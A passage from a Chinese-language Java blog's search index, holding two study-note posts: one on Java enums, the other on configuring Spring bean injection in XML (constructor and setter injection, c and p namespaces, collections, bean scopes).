，非常地不熟悉，今天剛好用到，順便記錄一下。 ","date":"2020-05-28","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/:0:0","tags":["java"],"title":"Java 使用 Enum 小記","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"簡單使用 public enum Action { STOP, RIGHT, LEFT, UP, DOWN } 這邊簡單可以看到 public static void play(int action) { switch(action) { case Action.STOP: System.out.println(\"播放停止動畫\"); break; 略... default: System.out.println(\"不支援此動作\"); } } 以前抄抄範例，這邊會發現int action 怎麼會跑出 int 出來？ 其實 Enum 反編譯出來，會跟原本 Enum 出來不一樣 不知道這算不算是 Java 語法糖? 略... static { STOP = new Action(\"STOP\", 0); RIGHT = new Action(\"RIGHT\", 1); LEFT = new Action(\"LEFT\", 2); UP = new Action(\"UP\", 3); DOWN = new Action(\"DOWN\", 4); 略... } 詳細內容可以看:使用 enum 列舉常數 ","date":"2020-05-28","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/:1:0","tags":["java"],"title":"Java 使用 Enum 小記","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"自定一些內容 我們公司使用不單是這樣 可以設定出 public enum Car { MAX_CAR(100,\"最高級車\"), NORM_CAR(5,\"中級車\"), MIN_CAR(1,\"低級車\"); private int price; private String desc; private Car(int price, String desc) { this.price = price; this.desc = desc; } public int price() { return price; } public String desc() { return desc; } public static void main(String[] args) { for(Car car : Car.values()) { System.out.printf(\"Car(%s, %d, %s)%n\", car , car.price() , car.desc()); } } } 這邊看到會對印到 MAX_CAR(100,\"最高級車\"), NORM_CAR(5,\"中級車\"), MIN_CAR(1,\"低級車\"); private Car(int price, String desc) { this.price = price; this.desc = desc; } 其他詳細可看:進階 enum 運用 ","date":"2020-05-28","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/:2:0","tags":["java"],"title":"Java 使用 Enum 小記","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"取出列表資料(values) for(Car car: Car.values()) System.out.println(car.name()); } .values() 可以印出列表出來 那有沒有find 呢? 目前看應該只能用迴圈滾… 轉成陣列方法 You can do (pre-Java 8): List\u003cEnum\u003e enumValues = Arrays.asList(Enum.values()); or List\u003cEnum\u003e enumValues = new ArrayList\u003cEnum\u003e(EnumSet.allOf(Enum.class)); Using Java 8 features, you can map each constant to its name: List\u003cString\u003e enumNames = Stream.of(Enum.values()) .map(Enum::name) .collect(Collectors.toList()); Java: Check if enum contains a given string? - Stack Overflow This should do it: public static boolean contains(String test) { for (Choice c : Choice.values()) { if (c.name().equals(test)) { return true; } } return false; } This way means you do not have to worry about adding additional enum values later, they are \u003e all checked. Edit: If the enum is very large you could stick the values in a HashSet: public static HashSet\u003cString\u003e getEnums() { HashSet\u003cString\u003e values = new HashSet\u003cString\u003e(); for (Choice c : Choice.values()) { values.add(c.name()); } return values; } Then you can just do: values.contains(“your string”) which returns true or false. ","date":"2020-05-28","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/:3:0","tags":["java"],"title":"Java 使用 Enum 小記","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"values() 神奇 method 實作方法 參考: Java Enum - javatpoint 原理 static 放 $VALUES 陣列變數，使用values() 會傳 $VALUES 陣列變數 ，就可以 foreach 比較。 final class Season extends Enum { public static Season[] values() { return (Season[])$VALUES.clone(); } public static Season valueOf(String s) { return (Season)Enum.valueOf(Season, s); } private Season(String s, int i, int j) { super(s, i); value = j; } public static final Season WINTER; public static final Season SUMMER; private int value; private static final Season $VALUES[]; static { WINTER = new Season(\"WINTER\", 0, 10); SUMMER = new Season(\"SUMMER\", 1, 20); $VALUES = (new Season[] { WINTER, SUMMER }); } } 其他之後有遇到再補 2020-06-18 ","date":"2020-05-28","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/:3:1","tags":["java"],"title":"Java 使用 Enum 小記","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"特別載入環境變數方法 最近做 Enum 發現測試環境跟正式環境設定的值會不一樣，所以找一下有什麼方法可以解決這個問題。 目前這邊還沒測試能不能這樣用。 java property file as enum - Stack Overflow public enum Constants { PROP1, PROP2; private static final String PATH = \"/constants.properties\"; private static final Logger logger = LoggerFactory.getLogger(Constants.class); private static Properties properties; private String value; private void init() { if (properties == null) { properties = new Properties(); try { properties.load(Constants.class.getResourceAsStream(PATH)); } catch (Exception e) { logger.error(\"Unable to load \" + PATH + \" file from classpath.\", e); System.exit(1); } } value = (String) properties.get(this.toString()); } public String getValue() { if (value == null) { init(); } return value; } } ","date":"2020-05-28","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/:4:0","tags":["java"],"title":"Java 使用 Enum 小記","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"enum 裡面帶 method 方法 //1.提供当前枚举类的对象，多个对象之间用逗号隔开，末尾对象分号结束 SPRING (\"春天\",\"春暖花开\"){ @Override public void show() { System.out.println(\"spring!!!\"); } }, SUMMER(\"夏天\",\"夏日炎炎\"){ @Override public void show() { System.out.println(\"summer!!!\"); } }, AUTUMN (\"秋天\",\"秋高气爽\"){ @Override public void show() { System.out.println(\"autumn!!!\"); } }, WINTER (\"冬天\",\"冰天雪地\"){ @Override public void show() { super.show(); System.out.println(\"winter!!!\"); } }; 參考: java枚举和注解 - 知乎 ","date":"2020-05-28","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/:5:0","tags":["java"],"title":"Java 使用 Enum 小記","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"實用範例 方便以後直接找 sample code 來用，畢竟真的不常寫，很容易要想怎麼寫。 最佳範例: 菜鳥工程師 肉豬: Java 列舉(Enum)範例 還是推薦看裡面內容。 public enum WeekDay { SUN(\"Sunday\",\"星期日\", 0), MON(\"Monday\",\"星期一\", 1), TUE(\"Tuesday\",\"星期二\", 2), WED(\"Wednesday\",\"星期三\", 3), THU(\"Thursday\",\"星期四\", 4), FRI(\"Friday\",\"星期五\", 5), SAT(\"Saturday\",\"星期六\", 6); WeekDay(String day, String chinese, int code){ this.day = day; this.chinese = chinese; this.code = code; } private final String day; private final String chinese; private int code; public static WeekDay getWeek(int i){ for(WeekDay weekDay : values()){ if(weekDay.getCode() == i) { return weekDay; } } return null; } public String getDay(){ return this.day; } public String getChinese() { return this.chinese; } public int getCode() { return this.code; } } ","date":"2020-05-28","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/:6:0","tags":["java"],"title":"Java 使用 Enum 小記","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"這邊主要是講手動注入 ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:0:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"一般 Spring 注入配置文件 一般通常都放在 /resource/applicationContext.xml \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\"\u003e \u003cbean ...\u003e \u003c/beans\u003e ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:1:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"一般配置 bean \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\"\u003e \u003cbean class=\"com.xxx.person.Student\" /\u003e \u003c/beans\u003e context.getBean(Student.class) 可以順利被載入 ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:2:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"載入是同一多個class 的 bean \u003cbean class=\"com.xxx.person.Student\" /\u003e \u003cbean class=\"com.xxx.person.Student\" /\u003e 一般 \u003cbean class=\"com.xxx.person.Student\" /\u003e 沒有定義 id 和 name 所以配置出來 Bean 名稱會是 com.xxx.person.Student#0 第二個就為com.xxx.person.Student#1 這邊跟自動注入出來名稱不一樣(JavaConfig 名稱為 xxxXxxxXxx ex:redCar ) 這時候 Java 呼叫 Bean 是透過 (Student)context.getBean(\"com.xxx.person.Student#0\"); 這邊 getBean 使用字串記得要強制轉型 不然 Java 認不出來 設為 id or name 如下 \u003cbean id=\"student1\" class=\"com.xxx.person.Student\" /\u003e \u003cbean id=\"student2\" class=\"com.xxx.person.Student\" /\u003e (Student)context.getBean(\"student1\") ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:3:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"使用 JUnit 這邊一樣用兩個 @RunWith(SpringJUnit4ClassRunner.class) @ContextConfiguration(“classpath:applicationContext.xml”) @RunWith(SpringJUnit4ClassRunner.class) @ContextConfiguration(\"classpath:applicationContext.xml\") public class AppTest{ @Autowired private Student student1; @Autowired private Student student2; } 這邊注意 student1 的對應 bean id XML 這一行\u003cbean id=\"student1\" class=\"com.xxx.person.Student\" /\u003e 名稱要跟xml 配置一致 複習自動注入是看 class 名稱(xxxXxxx) ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:4:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"id 和 name 差別 \u003cbean name=\"student1_1 student1_2\" class=\"com.xxx.person.Student\" /\u003e \u003cbean name=\"student2\" class=\"com.xxx.person.Student\" /\u003e name 可以多個命名，如上第一行 student1_1 student1_2 可用空白、逗號、加號 id 就不行，但也不是說不能這樣寫\u003cbean name=\"student1_1 student1_2\" class=\"com.xxx.person.Student\" /\u003e 只是這邊是指 student1_1 student1_2 是一個名稱 所以這邊就沒辦法 @Autowired 方式 @Autowired private Student student1_1 student1_2; 要這樣使用(Student) context.getBean(\"student1_1 student1_2\"); ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:4:1","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"建構式注入方法 \u003cconstructor-arg\u003e c-名稱空間入住(Spring 3.0 引進) ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:5:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"constructor-arg tag \u003cbean id=\"seat1\" class=\"com.xxx.Seat\"\u003e \u003cconstructor-arg name=\"student\" ref=\"student1\" /\u003e \u003c/bean\u003e 這邊的 name 是指 建構式的參數Seat (Student student) public class Seat{ private Student st; public Seat(Student student){ this.st = student; } } 細說(可能用不到) \u003c!-- value 可以放值 --\u003e \u003cconstructor-arg name = \"name\" value = \"tom\"\u003e\u003c/constructor-arg\u003e \u003c!-- null --\u003e \u003cconstructor-arg name = \"name\"\u003e \u003cnull\u003e\u003c/null\u003e \u003c/constructor-arg\u003e \u003c!-- --\u003e \u003cconstructor-arg type=\"int\" value=\"2001\"/\u003e \u003cconstructor-arg type=\"java.lang.String\" value=\"Zara\"/\u003e \u003c!-- index --\u003e \u003cconstructor-arg index=\"0\" value=\"2001\"/\u003e \u003cconstructor-arg index=\"1\" value=\"Zara\"/\u003e Spring 3 開始好像才能用建構式的參數 java - Spring - Attribute ’name’ is not allowed to appear in element ‘constructor-arg’ - Stack Overflow 在之前版本應該都是用 index 方式 （1）set注入：優點降低了耦合程度，可以按需生成set方法進行傳值；缺點：當需要注入的參數很多時，會有很多的set方法 （2）構造方法注入：增加了耦合程度，因為默認的無參的構造方法被覆蓋了；不能按需傳參； sping官方推薦：使用set注入方法 參考: Spring學習筆記二：構造方法注入 ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:5:1","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"C 名稱空間注入 先說 c 名稱空間跟 p 名稱空間 沒關係 宣告方法 \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:c=\"http://www.springframework.org/schema/c\" 建構子注入 \u003cbean id=\"seat1\" class=\"com.xxx.Seat\" c:st-ref=\"student1\"\u003e\u003c/bean\u003e 這邊可以換成位置 c:_0-ref=“student1” 但我覺得用 name 比較實用 非 Bean 的值可以用 c:_1=“201799777799” c:_2-ref=“notify” 使用名稱注入 這邊 bean 是我邊的 \u003cbean id=\"seat1\" class=\"com.xxx.Seat\" c:teacherName=\"john\"\u003e\u003c/bean\u003e xml 是區分大小寫的 XML解析忽略标签名的大小写_java_一直在路上-CSDN博客 ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:5:2","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"建構式注入集合(collections) list \u003c!--字串--\u003e \u003cconstructor-arg name = \"name\"\u003e \u003clist\u003e \u003cvalue\u003eHello 1\u003c/value\u003e \u003cvalue\u003eHello 2\u003c/value\u003e \u003cvalue\u003eHello 2\u003c/value\u003e \u003c/list\u003e \u003c/constructor-arg\u003e \u003c!-- bean --\u003e \u003cconstructor-arg name = \"name\"\u003e \u003clist\u003e \u003cref bean=\"{Bean_id}\" /\u003e \u003cref bean=\"{Bean_id}\" /\u003e \u003cref bean=\"{Bean_id}\" /\u003e \u003cref bean=\"student1\" /\u003e \u003c/list\u003e \u003c/constructor-arg\u003e Set \u003c!--字串--\u003e \u003cconstructor-arg name = \"name\"\u003e \u003cset\u003e \u003cvalue\u003eHello 1\u003c/value\u003e \u003cvalue\u003eHello 2\u003c/value\u003e \u003cvalue\u003eHello 2\u003c/value\u003e \u003c/set\u003e \u003c/constructor-arg\u003e \u003c!-- bean --\u003e \u003cconstructor-arg name = \"name\"\u003e \u003cset\u003e \u003cref bean=\"{Bean_id}\" /\u003e \u003cref bean=\"{Bean_id}\" /\u003e \u003cref bean=\"{Bean_id}\" /\u003e \u003cref bean=\"student1\" /\u003e \u003c/set\u003e \u003c/constructor-arg\u003e 一般 Set 在 Java 是無序列排序 但是在 Spring 使用 LinkedHashSet，所以是有排序的 使用 C 名稱無法使用集合(collection)注入 map \u003cconstructor-arg name = \"name\"\u003e \u003cmap\u003e \u003centry key=\"m1\" value=\"value1\" /\u003e \u003centry key=\"m1\" value-ref=\"{bean_id}\" /\u003e \u003c/map\u003e \u003c/constructor-arg\u003e array \u003c!-- string --\u003e \u003cconstructor-arg name = \"name\"\u003e \u003clist\u003e \u003cvalue\u003eHello 1\u003c/value\u003e \u003cvalue\u003eHello 2\u003c/value\u003e \u003cvalue\u003eHello 3\u003c/value\u003e \u003c/list\u003e \u003c/constructor-arg\u003e \u003c!-- bean --\u003e \u003cconstructor-arg name = \"name\"\u003e \u003clist\u003e \u003cref bean=\"{Bean_id}\" /\u003e \u003cref bean=\"{Bean_id}\" /\u003e \u003cref bean=\"{Bean_id}\" /\u003e \u003cref bean=\"student1\" /\u003e \u003c/list\u003e \u003c/constructor-arg\u003e 使用 java 方式 String[] student; Student[] student; ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:5:3","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"屬性(setter) 注入 \u003cbean id=\"student1\" class=\"com.xxx.student\"\u003e \u003cproperty name=\"name\" value=\"John\" /\u003e \u003c/bean\u003e \u003cbean id=\"student2\" class=\"com.xxx.student\"\u003e \u003cproperty name=\"name\" value=\"Kane\" /\u003e \u003c/bean\u003e class Student{ private String name; public String setName(String name){ this.name = name; } } 屬性名字如上 name，是跟著 setName一致 假如 method 名稱改成 setName1， xml 配住需要改\u003cproperty name=\"name1\" value=\"Kane\"\u003e ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:6:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"一般 property 標籤方法 array \u003cbean id=\"classroom1\" class=\"com.xxx.classroom\"\u003e \u003cproperty name=\"students\"\u003e \u003carray\u003e \u003cref bean=\"student1\"\u003e \u003cref bean=\"student2\"\u003e \u003c/array\u003e \u003c/property\u003e \u003c/bean\u003e list \u003cbean id=\"classroom1\" class=\"com.xxx.classroom\"\u003e \u003cproperty name=\"students\"\u003e \u003clist\u003e \u003cref bean=\"student1\"\u003e \u003cref bean=\"student2\"\u003e \u003c/list\u003e \u003c/property\u003e \u003c/bean\u003e set \u003cbean id=\"classroom1\" class=\"com.xxx.classroom\"\u003e \u003cproperty name=\"students\"\u003e \u003cset\u003e \u003cref bean=\"student1\"\u003e \u003cref bean=\"student2\"\u003e \u003c/set\u003e \u003c/property\u003e \u003c/bean\u003e object \u003cbean id=\"classroom1\" class=\"com.xxx.classroom\"\u003e \u003cproperty name=\"student\" ref=\"student1\" /\u003e \u003c/bean\u003e ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:6:1","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"p 命名空間 在 beans 屬性加入 xmlns:p=\"http://www.springframework.org/schema/p\" 如: \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p=\"http://www.springframework.org/schema/p\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"\u003e 一般使用方法 \u003cbean id=\"student1\" class=\"com.xxx.student\" p:name=\"John\"\u003e \u003c/bean\u003e object \u003cbean id=\"classroom1\" class=\"com.xxx.Classroom\" p:student-ref=\"student1\"\u003e \u003c/bean\u003e 備註 p 命名空間一樣不能用集合(collection)方法 util 名稱空間 只能用在 p命名空間 宣告 xmlns:util=\"http://www.springframework.org/schema/util\" 和 xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.1.xsd http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util-4.1.xsd\"\u003e 結果 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:util=\"http://www.springframework.org/schema/util\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.1.xsd http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util-4.1.xsd\"\u003e 使用 array 或 list \u003cutil:list id=\"studentList\"\u003e \u003cref bean=\"student1\" /\u003e \u003cref bean=\"student2\" /\u003e \u003c/util:list\u003e \u003cbean id=\"classroom1\" class=\"com.xxx.classroom\" p:students-ref=\"studentList\"\u003e \u003c!-- \u003cproperty name=\"students\"\u003e \u003clist\u003e \u003cref bean=\"student1\"\u003e \u003cref bean=\"student2\"\u003e \u003c/list\u003e \u003c/property\u003e --\u003e \u003c/bean\u003e set、map \u003cutil:map id=\"studentList\"\u003e \u003cref bean=\"student1\" /\u003e \u003cref bean=\"student2\" /\u003e \u003c/util:map\u003e 以此類推 ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:6:2","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"複習Spring 那些裝配 自動裝配 Java 裝配 XML 裝配 ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:7:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"相關知識 ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:8:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"預設注入生命週期 \u003cbean id=\"student1\" class=\"com.xxx.student\" p:name=\"John\"\u003e \u003c/bean\u003e public class Student{ public test1(){ System.out.println(\" Student \" + this.toString()); } } @RunWith(SpringJUnit4ClassRunner.class) @ContextConfiguration(\"classpath:applicationContext.xml\") public class AppTest{ @Autowired private Student student1; @Autowired private Student student2; @test public void test1(){ } } public class AppTest{ public static void main(String[] argv){ ApplicationContext context = new ClassPathXmlApplicationContext(\"applicationContext.xml\"); // Student st1 = (Student)context.getBean(\"student\"); // Student st2 = (Student)context.getBean(\"student\"); // System.out.println(st1 == st2); //true } } 執行程式會看到 Bean 會啟動，不管會不會呼叫 預設啟動是單例模式 ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:8:1","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"生命週期 單例(Sinletion) 在整個應用程序中，只創建 bean 的一個實例 原型(Prototype) 每次注入或通過 Spring 上下文獲取的時候，都會創建一個新的 bean 實例 簡單說就是每一次 @Autowired 都會實例出來 會話(Session) 在 Web 應用中，為每個會話創建一個 bean 實例 請求(Request) 在 Web 應用中，為每個請求創建一個 bean 實例 設定生命周期作用域 scope= \u003cbean id=\"student1\" class=\"com.xxx.student\" p:name=\"John\" scope=\"prototype\"\u003e \u003c/bean\u003e ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:8:2","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"總整理作用域配置 ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:9:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"xml 配置 scope=“singleton” ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:9:1","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"自動裝配 @Component @Scope(“singletion”) ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:9:2","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"JavaConfig 配置 @Bean @Scope(ConfigurableBeanFactory.SCOPE_SINGLETON) ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:9:3","tags":["spring"],"title":"手動配置 XML 注入 Bean 